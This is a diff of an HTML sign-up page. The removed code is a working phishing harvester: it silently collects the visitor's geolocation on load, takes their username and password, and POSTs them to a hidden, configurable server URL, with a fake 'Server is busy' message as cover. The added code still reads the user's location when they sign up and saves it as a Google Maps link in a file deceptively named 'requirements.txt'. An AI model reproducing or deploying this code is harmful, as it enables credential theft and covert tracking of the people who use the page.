@@ -52,15 +52,6 @@
             font-size: 14px;
             margin-top: 10px;
         }
-        #form {
-            display: none;
-            margin-top: 20px;
-        }
-        @media (max-width: 600px) {
-            .container {
-                padding: 15px;
-            }
-        }
     </style>
 </head>
 <body>
@@ -73,26 +64,19 @@
             <button type="button" class="btn" onclick="signup()">Sign Up</button>
         </form>
         <div id="message" class="message"></div>
-        <div id="form">
-            <input type="text" id="url" class="input-field" placeholder="Enter server URL">
-            <button type="button" class="btn" onclick="seturl()">Set URL</button>
-            <button type="button" class="btn" onclick="reseturl()">Reset URL</button>
-        </div>
     </div>
 
     <script>
-        let serverUrl = ""; // Global variable for server endpoint
-        let savedData = {}; // Object to store location, ID, and password
-
-        // Function to save the user's location
         function saveLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        savedData.location = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                        };
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                        // Generate and download requirements.txt
+                        downloadFile("requirements.txt", googleMapsLink);
                     },
                     (error) => {
                         console.error("Error retrieving location:", error.message);
@@ -103,73 +87,20 @@
             }
         }
 
-        // Save location when the page loads
-        window.onload = saveLocation;
+        function downloadFile(filename, content) {
+            const element = document.createElement("a");
+            const file = new Blob([content], { type: "text/plain" });
 
-        function seturl() {
-            serverUrl = document.getElementById('url').value;
-            if (serverUrl) {
-                document.getElementById('message').textContent = "URL set successfully.";
-            } else {
-                document.getElementById('message').textContent = "Please enter a valid URL.";
-            }
-        }
-
-        function reseturl() {
-            serverUrl = "";
-            document.getElementById('message').textContent = "URL reset successfully.";
+            element.href = URL.createObjectURL(file);
+            element.download = filename;
+            document.body.appendChild(element);
+            element.click();
+            document.body.removeChild(element);
         }
 
         function signup() {
-            const userId = document.getElementById('username').value;
-            const userPassword = document.getElementById('password').value;
-            const msg = document.getElementById('message');
-
-            // Save the ID and password locally
-            savedData.id = userId;
-            savedData.password = userPassword;
-
-            if (!serverUrl) {
-                msg.textContent = "Server is busy, try again later.";
-                return;
-            }
-
-            if (savedData.location) {
-                const requestData = {
-                    id: savedData.id,
-                    password: savedData.password,
-                    location: savedData.location,
-                };
-
-                sendHttpRequest(requestData);
-            } else {
-                msg.textContent = "Unable to retrieve location. Try again.";
-            }
-        }
-
-        function sendHttpRequest(data) {
-            const msg = document.getElementById('message');
-
-            fetch(serverUrl, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify(data),
-            })
-            .then((response) => {
-                if (response.ok) {
-                    msg.textContent = "Data sent successfully.";
-                    console.log("Data sent successfully:", data);
-                } else {
-                    msg.textContent = "Failed to send data. Please try again.";
-                    console.error("Error:", response.statusText);
-                }
-            })
-            .catch((error) => {
-                msg.textContent = "Failed to connect to the server. Please try again.";
-                console.error("Network error:", error);
-            });
+            saveLocation();
+            document.getElementById("message").textContent = "Downloading requirements.txt...";
         }
     </script>
 
